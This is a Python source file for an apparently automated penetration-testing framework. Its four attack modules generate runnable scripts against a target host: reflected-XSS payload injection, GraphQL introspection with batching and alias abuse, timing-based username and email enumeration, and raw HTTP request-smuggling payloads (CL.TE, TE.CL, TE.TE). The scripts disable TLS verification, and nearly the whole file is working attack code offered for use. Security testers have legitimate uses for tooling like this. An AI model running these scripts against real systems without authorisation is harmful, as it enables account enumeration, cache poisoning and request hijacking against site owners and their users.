"""Attack modules: web."""

from __future__ import annotations

from typing import Any

from tools.attack_modules.base import AttackModule, ModuleContext


class XSSScanner(AttackModule):
    name = "XSSScanner"
    description = "Reflected and stored XSS payload injection"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443]
    required_cves = []
    # Capability metadata: reflected-XSS detection -- surfaces a finding, no
    # foothold/credential artifact.
    requires: list[str] = []
    produces: list[str] = []
    read_only = False
    cost = "low"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Tests common XSS payloads against URL parameters and forms.",
            "evidence": [f"XSS payload injection queued against {ctx.target_ip}"],
            "references": [
                "https://owasp.org/www-community/attacks/xss/",
                "https://portswigger.net/web-security/cross-site-scripting",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        # Phase 2: `requests` is NOT a declared dependency -- rewritten with
        # stdlib urllib so the generated script runs on a fresh install.
        return f"""import sys, urllib.request, urllib.parse, urllib.error, ssl
# Target: {ctx.target_ip}
host = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
scheme = "https" if port in (443, 8443) else "http"
base = f"{{scheme}}://{{host}}:{{port}}"
ctx_ssl = ssl.create_default_context()
ctx_ssl.check_hostname = False
ctx_ssl.verify_mode = ssl.CERT_NONE
payloads = [
    '''<script>alert('XSS')</script>''',
    '''<img src=x onerror=alert('XSS')>''',
    ''''"><script>alert('XSS')</script>''',
    '''<body onload=alert('XSS')>''',
]
for payload in payloads:
    try:
        url = f"{{base}}/search?q={{urllib.parse.quote(payload)}}"
        req = urllib.request.Request(url)
        resp = urllib.request.urlopen(req, timeout=10, context=ctx_ssl)
        text = resp.read().decode(errors="replace")
        if payload in text:
            print(f"XSS REFLECTED: {{payload[:50]}}")
            break
    except Exception as e:
        pass
"""


# ---------------------------------------------------------------------------
# Credential Operations
# ---------------------------------------------------------------------------


class GraphQLIntrospect(AttackModule):
    name = "GraphQLIntrospect"
    description = "GraphQL schema extraction, query depth abuse, batching attacks, and introspection"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443, 3000, 4000, 5000]
    required_cves = []
    # Capability metadata: schema introspection is enumeration -- it surfaces
    # types/fields, not a foothold or credential.
    requires: list[str] = []
    produces: list[str] = []
    read_only = True
    cost = "low"
    phase_hint = "enumerate"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Extracts GraphQL schema via introspection, tests query depth limits, and batch attacks.",
            "evidence": [f"GraphQL introspection queued against {ctx.target_ip}"],
            "references": [
                "https://portswigger.net/web-security/graphql",
                "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        target = ctx.target_ip
        return (
            '"""GraphQL Introspection & Attack Toolkit."""\n'
            "import json, sys, urllib.request, urllib.error\n"
            "\n"
            f'TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target}"\n'
            "PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80\n"
            'SCHEME = "https" if PORT in (443, 8443) else "http"\n'
            'BASE = f"{SCHEME}://{TARGET}:{PORT}"\n'
            "\n"
            'INTROSPECTION_QUERY = """\n'
            "query IntrospectionQuery {\n"
            "  __schema {\n"
            "    queryType { name }\n"
            "    mutationType { name }\n"
            "    subscriptionType { name }\n"
            "    types {\n"
            "      name kind description\n"
            "      fields { name description type { name kind ofType { name kind } } args { name description type { name kind } } }\n"
            "      inputFields { name description type { name kind } }\n"
            "      enumValues { name description }\n"
            "    }\n"
            "    directives { name description locations args { name description type { name kind } } }\n"
            "  }\n"
            "}\n"
            '"""\n'
            "\n"
            'DEPTH_ATTACK_QUERY = """\n'
            "query DeepQuery {\n"
            "  level0: __typename\n"
            "  {nested}\n"
            "}\n"
            '"""\n'
            "\n"
            "BATCH_ATTACK = [\n"
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            '    {"query": "{ __typename }"},\n'
            "]\n"
            "\n"
            'ALIAS_ATTACK = "query AliasedQuery { " + " ".join(f"a{i}: __typename" for i in range(100)) + " }"\n'
            "\n"
            "def graphql_request(endpoint, query):\n"
            '    """Send a GraphQL request and return parsed response."""\n'
            "    if isinstance(query, str):\n"
            '        payload = {"query": query}\n'
            "    elif isinstance(query, list):\n"
            "        payload = query\n"
            "    else:\n"
            "        payload = query\n"
            "    data = json.dumps(payload).encode()\n"
            "    try:\n"
            '        req = urllib.request.Request(endpoint, data=data, headers={"Content-Type": "application/json"}, method="POST")\n'
            "        with urllib.request.urlopen(req, timeout=15) as resp:\n"
            "            return json.loads(resp.read().decode())\n"
            "    except urllib.error.HTTPError as e:\n"
            '        return {"error": e.code, "body": e.read().decode(errors="replace")[:500]}\n'
            "    except Exception as e:\n"
            '        return {"error": str(e)}\n'
            "\n"
            'graphql_endpoints = ["/graphql", "/gql", "/api/graphql", "/v1/graphql", "/query", "/graphiql"]\n'
            "found_endpoint = None\n"
            "for ep in graphql_endpoints:\n"
            '    url = f"{BASE}{ep}"\n'
            '    result = graphql_request(url, "{ __typename }")\n'
            '    if "data" in result and "__typename" in str(result.get("data", {})):\n'
            "        found_endpoint = url\n"
            '        print(f"[+] GraphQL endpoint found: {url}")\n'
            "        break\n"
            '    elif "error" not in result:\n'
            '        print(f"[?] Possible GraphQL at {url}: {json.dumps(result)[:200]}")\n'
            "\n"
            "if not found_endpoint:\n"
            '    print("[-] No GraphQL endpoint found. Trying common paths anyway...")\n'
            '    found_endpoint = f"{BASE}/graphql"\n'
            "\n"
            'print(f"\\n=== Testing: {found_endpoint} ===\\n")\n'
            "\n"
            'print("[1] Schema Introspection...")\n'
            "intro_result = graphql_request(found_endpoint, INTROSPECTION_QUERY)\n"
            'if "data" in intro_result and intro_result["data"].get("__schema"):\n'
            '    schema = intro_result["data"]["__schema"]\n'
            '    types_count = len(schema.get("types", []))\n'
            '    print(f"  [+] Introspection ENABLED! {types_count} types exposed.")\n'
            '    for t in schema.get("types", [])[:20]:\n'
            '        name = t.get("name", "?")\n'
            '        kind = t.get("kind", "?")\n'
            '        fields = [f.get("name", "?") for f in t.get("fields", [])[:5]] if t.get("fields") else []\n'
            "        if fields:\n"
            "            print(f\"    {kind} {name}: {', '.join(fields)}\")\n"
            "else:\n"
            '    print(f"  [-] Introspection disabled or blocked: {json.dumps(intro_result)[:200]}")\n'
            "\n"
            'print("\\n[2] Query Depth Attack...")\n'
            "# Depth via introspection nesting (valid against any GraphQL server --\n"
            "# __typename is a leaf and cannot take subselections, so the old\n"
            "# level{i}: __typename { ... } builder always errored and the error\n"
            "# heuristic then misreported 'limit enforced' on every target).\n"
            'depth_query = "query DeepQuery { __schema { types { fields { type { ofType { name kind ofType { name kind } } } } } } }"\n'
            "depth_result = graphql_request(found_endpoint, depth_query)\n"
            'depth_blob = json.dumps(depth_result).lower()\n'
            'if any(k in depth_blob for k in ("max depth", "depth limit", "too deep", "complexity", "exceeds")):\n'
            '    print(f"  [+] Depth/complexity limit enforced: {json.dumps(depth_result)[:300]}")\n'
            'elif "data" in depth_result and depth_result.get("data"):\n'
            '    print(f"  [!] No depth limit detected (deep introspection accepted)")\n'
            "else:\n"
            '    print(f"  [?] Depth probe rejected (inspect -- may or may not be a limit): {json.dumps(depth_result)[:300]}")\n'
            "\n"
            'print("\\n[3] Batching Attack (10 queries in one request)...")\n'
            "batch_result = graphql_request(found_endpoint, BATCH_ATTACK)\n"
            "if isinstance(batch_result, list) and len(batch_result) == 10:\n"
            '    print(f"  [+] Batching ENABLED! {len(batch_result)} responses returned.")\n'
            "else:\n"
            '    print(f"  [-] Batching blocked: {json.dumps(batch_result)[:200]}")\n'
            "\n"
            'print("\\n[4] Alias Attack (100 aliases)...")\n'
            "alias_result = graphql_request(found_endpoint, ALIAS_ATTACK)\n"
            'if "data" in alias_result:\n'
            '    count = len(alias_result.get("data", {}))\n'
            '    print(f"  [+] Alias attack accepted: {count} aliases processed")\n'
            "else:\n"
            '    print(f"  [-] Alias attack blocked: {json.dumps(alias_result)[:200]}")\n'
            "\n"
            'print("\\n[!] Use extracted schema to find sensitive queries, mutations, and IDOR vectors.")\n'
        )


# ---------------------------------------------------------------------------
# Race Condition & Timing Attack Modules
# ---------------------------------------------------------------------------


class TimingOracle(AttackModule):
    name = "TimingOracle"
    description = "Detect timing side-channels in auth/validation endpoints for user enumeration and blind extraction"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443]
    required_cves = []
    # Capability metadata: timing side-channel detection = enumeration (user
    # enumeration, blind extraction). Read-only: only measures response times.
    requires: list[str] = []
    produces: list[str] = []
    read_only = True
    cost = "low"
    phase_hint = "enumerate"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Measures response time differences to detect user enumeration, blind SQLi, and timing oracles.",
            "evidence": [f"timing-oracle measurements queued against {ctx.target_ip}"],
            "references": [
                "https://owasp.org/www-community/attacks/Timing_Attacks",
                "https://portswigger.net/web-security/sql-injection/blind",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''"""Timing Oracle Detector — find side-channels in auth and validation."""
import json, statistics, sys, time, urllib.request, urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
SCHEME = "https" if PORT in (443, 8443) else "http"
BASE = f"{{SCHEME}}://{{TARGET}}:{{PORT}}"
SAMPLES = 10
THRESHOLD_MS = 50  # Significant timing difference threshold

def measure_request(url: str, method: str = "POST", data: bytes = b"", headers: dict = None) -> list[float]:
    """Measure response time over multiple samples."""
    times = []
    hdrs = headers or {{}}
    for _ in range(SAMPLES):
        try:
            req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
            start = time.perf_counter()
            with urllib.request.urlopen(req, timeout=10) as resp:
                resp.read()
            elapsed = (time.perf_counter() - start) * 1000
            times.append(elapsed)
        except urllib.error.HTTPError as e:
            elapsed = (time.perf_counter() - start) * 1000
            times.append(elapsed)
            e.read()
        except Exception:
            pass
        time.sleep(0.1)  # Small delay between samples
    return times

def analyze_timing(name: str, times_a: list[float], times_b: list[float]) -> dict:
    """Compare two timing distributions."""
    if len(times_a) < 3 or len(times_b) < 3:
        return {{"name": name, "significant": False, "reason": "insufficient samples",
                 "mean_a_ms": 0.0, "mean_b_ms": 0.0, "diff_ms": 0.0,
                 "stdev_a": 0.0, "stdev_b": 0.0}}

    mean_a = statistics.mean(times_a)
    mean_b = statistics.mean(times_b)
    stdev_a = statistics.stdev(times_a) if len(times_a) > 1 else 0
    stdev_b = statistics.stdev(times_b) if len(times_b) > 1 else 0
    diff = abs(mean_a - mean_b)

    significant = diff > THRESHOLD_MS and diff > (stdev_a + stdev_b)
    return {{
        "name": name,
        "mean_a_ms": round(mean_a, 2),
        "mean_b_ms": round(mean_b, 2),
        "diff_ms": round(diff, 2),
        "significant": significant,
        "stdev_a": round(stdev_a, 2),
        "stdev_b": round(stdev_b, 2),
    }}

print(f"=== Timing Oracle Detection: {{BASE}} ===\\n")

# Test 1: User enumeration via login
print("[1] Login Timing — valid vs invalid user...")
valid_user_times = measure_request(
    f"{{BASE}}/api/login",
    data=json.dumps({{"username": "admin", "password": "wrongpass"}}).encode(),
    headers={{"Content-Type": "application/json"}},
)
invalid_user_times = measure_request(
    f"{{BASE}}/api/login",
    data=json.dumps({{"username": "nonexistent_user_xyz_123", "password": "test"}}).encode(),
    headers={{"Content-Type": "application/json"}},
)
result = analyze_timing("Login Enumeration", valid_user_times, invalid_user_times)
print(f"  Valid user mean: {{result['mean_a_ms']}}ms, Invalid: {{result['mean_b_ms']}}ms, Diff: {{result['diff_ms']}}ms")
if result["significant"]:
    print(f"  [+] TIMING ORACLE DETECTED! Usernames can be enumerated via timing.")
else:
    print(f"  [-] No significant timing difference.")

# Test 2: Password reset timing
print("\\n[2] Password Reset Timing — existing vs non-existing email...")
exist_times = measure_request(
    f"{{BASE}}/api/reset-password",
    data=json.dumps({{"email": "admin@example.com"}}).encode(),
    headers={{"Content-Type": "application/json"}},
)
noexist_times = measure_request(
    f"{{BASE}}/api/reset-password",
    data=json.dumps({{"email": "noexist_xyz_123@example.com"}}).encode(),
    headers={{"Content-Type": "application/json"}},
)
result = analyze_timing("Password Reset", exist_times, noexist_times)
print(f"  Exist mean: {{result['mean_a_ms']}}ms, No-exist: {{result['mean_b_ms']}}ms, Diff: {{result['diff_ms']}}ms")
if result["significant"]:
    print(f"  [+] TIMING ORACLE DETECTED! Email enumeration via password reset.")
else:
    print(f"  [-] No significant timing difference.")

# Test 3: API key / token validation
print("\\n[3] Token Validation Timing — valid prefix vs random...")
valid_prefix_times = measure_request(
    f"{{BASE}}/api/validate",
    data=json.dumps({{"token": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"}}).encode(),
    headers={{"Content-Type": "application/json"}},
)
random_times = measure_request(
    f"{{BASE}}/api/validate",
    data=json.dumps({{"token": "x" * 100}}).encode(),
    headers={{"Content-Type": "application/json"}},
)
result = analyze_timing("Token Validation", valid_prefix_times, random_times)
print(f"  Valid prefix mean: {{result['mean_a_ms']}}ms, Random: {{result['mean_b_ms']}}ms, Diff: {{result['diff_ms']}}ms")
if result["significant"]:
    print(f"  [+] TIMING ORACLE DETECTED! Token validation leaks information.")
else:
    print(f"  [-] No significant timing difference.")

print("\\n[!] Timing oracles can be exploited for blind data extraction (e.g., blind SQLi character-by-character).")
'''


class RequestSmuggling(AttackModule):
    name = "RequestSmuggling"
    description = "HTTP request smuggling detection and exploitation (CL.TE, TE.CL, TE.TE)"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443]
    required_cves = []
    # Capability metadata: smuggling detection; a confirmed desync can poison
    # caches / hijack requests but surfaces as a finding, not an artifact.
    requires: list[str] = []
    produces: list[str] = []
    read_only = False
    cost = "medium"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Tests CL.TE, TE.CL, and TE.TE smuggling variants. Can poison caches and hijack requests.",
            "evidence": [f"request-smuggling probes queued against {ctx.target_ip}"],
            "references": [
                "https://portswigger.net/web-security/request-smuggling",
                "https://book.hacktricks.wiki/en/pentesting-web/http-request-smuggling.html",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''"""HTTP Request Smuggling Detector — CL.TE / TE.CL / TE.TE attacks."""
import socket, ssl, sys, time

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
USE_TLS = PORT in (443, 8443)

def send_raw(host: str, port: int, payload: bytes, use_tls: bool = False) -> bytes:
    """Send raw HTTP bytes and return response."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    if use_tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)
    sock.connect((host, port))
    sock.sendall(payload)
    time.sleep(1)
    response = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass
    sock.close()
    return response

def test_cl_te(host: str, port: int, use_tls: bool) -> dict:
    """CL.TE: Content-Length vs Transfer-Encoding mismatch (front-end uses CL, back-end uses TE)."""
    payload = (
        f"POST / HTTP/1.1\\r\\n"
        f"Host: {{host}}\\r\\n"
        f"Content-Length: 6\\r\\n"
        f"Transfer-Encoding: chunked\\r\\n"
        f"\\r\\n"
        f"0\\r\\n"
        f"\\r\\n"
        f"G"
    ).encode()
    response = send_raw(host, port, payload, use_tls)
    text = response.decode(errors="replace")
    # If back-end uses TE, it sees "0\\r\\n\\r\\nG" — the "G" is left in the buffer
    # causing a timeout or error on the next request
    return {{"type": "CL.TE", "response_len": len(response), "response_preview": text[:300]}}

def test_te_cl(host: str, port: int, use_tls: bool) -> dict:
    """TE.CL: Transfer-Encoding vs Content-Length mismatch (front-end uses TE, back-end uses CL)."""
    payload = (
        f"POST / HTTP/1.1\\r\\n"
        f"Host: {{host}}\\r\\n"
        f"Content-Length: 4\\r\\n"
        f"Transfer-Encoding: chunked\\r\\n"
        f"\\r\\n"
        f"5c\\r\\n"
        f"GPOST / HTTP/1.1\\r\\n"
        f"Host: {{host}}\\r\\n"
        f"Content-Length: 15\\r\\n"
        f"\\r\\n"
        f"x=1\\r\\n"
        f"0\\r\\n"
        f"\\r\\n"
    ).encode()
    response = send_raw(host, port, payload, use_tls)
    text = response.decode(errors="replace")
    return {{"type": "TE.CL", "response_len": len(response), "response_preview": text[:300]}}

def test_te_te(host: str, port: int, use_tls: bool) -> dict:
    """TE.TE: Obfuscated Transfer-Encoding header to confuse one proxy."""
    payload = (
        f"POST / HTTP/1.1\\r\\n"
        f"Host: {{host}}\\r\\n"
        f"Content-Length: 4\\r\\n"
        f"Transfer-Encoding: chunked\\r\\n"
        f"Transfer-encoding: x\\r\\n"
        f"\\r\\n"
        f"5c\\r\\n"
        f"GPOST / HTTP/1.1\\r\\n"
        f"Host: {{host}}\\r\\n"
        f"\\r\\n"
        f"0\\r\\n"
        f"\\r\\n"
    ).encode()
    response = send_raw(host, port, payload, use_tls)
    text = response.decode(errors="replace")
    return {{"type": "TE.TE", "response_len": len(response), "response_preview": text[:300]}}

print(f"=== HTTP Request Smuggling Detection: {{TARGET}}:{{PORT}} ===\\n")

# Baseline
print("[0] Baseline request...")
baseline = send_raw(
    TARGET, PORT,
    f"POST / HTTP/1.1\\r\\nHost: {{TARGET}}\\r\\nContent-Length: 0\\r\\n\\r\\n".encode(),
    USE_TLS,
)
print(f"  Baseline response: {{len(baseline)}} bytes")

# Run tests
tests = [
    ("CL.TE", test_cl_te),
    ("TE.CL", test_te_cl),
    ("TE.TE", test_te_te),
]

for name, test_fn in tests:
    print(f"\\n[Test] {{name}}...")
    try:
        result = test_fn(TARGET, PORT, USE_TLS)
        print(f"  Response: {{result['response_len']}} bytes")
        print(f"  Preview: {{result['response_preview'][:200]}}")

        # Heuristic: if response differs significantly from baseline, smuggling may exist
        if abs(result["response_len"] - len(baseline)) > 200:
            print(f"  [!] Response differs from baseline — possible {{name}} smuggling!")
        if "Unrecognized method" in result["response_preview"] or "GPOST" in result["response_preview"]:
            print(f"  [+] SMUGGLING CONFIRMED! Back-end saw smuggled 'GPOST' request!")
    except Exception as e:
        print(f"  Error: {{e}}")

print("\\n[!] Confirmed smuggling can be used for cache poisoning, request hijacking, and auth bypass.")
'''


# ---------------------------------------------------------------------------
# Server-Side Request Forgery / XML External Entity / Local File Inclusion
# ---------------------------------------------------------------------------
